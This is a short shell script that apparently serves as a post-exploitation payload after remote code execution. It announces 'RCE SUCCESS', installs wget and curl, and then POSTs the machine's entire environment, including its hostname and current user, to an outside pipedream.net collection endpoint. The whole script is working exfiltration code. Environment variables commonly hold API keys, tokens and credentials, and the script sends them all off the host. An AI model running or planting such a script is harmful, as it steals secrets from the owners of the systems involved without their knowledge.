echo "------------"
echo "RCE SUCCESS"
echo "------------"

URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
ENV=$(env)

apt-get update
apt-get install -qq -y wget curl

echo "------------"
echo "Printing ENV"
echo "------------"
env


if [ -x "$(command -v wget)" ]; then
  echo "------------"
  echo "Download with wget"
  echo wget -qO- "$URL" --post-data="$ENV";
  echo "------------"

  wget -qO- "$URL" --post-data="$ENV";
  exit 1
fi

if [ -x "$(command -v curl)" ]; then
  echo "------------"
  echo "Download with curl"
  echo wget -qO- "$URL" --post-data="$ENV";
  echo "------------"
  curl "$URL" -X POST -d "$ENV";
  exit 1
fi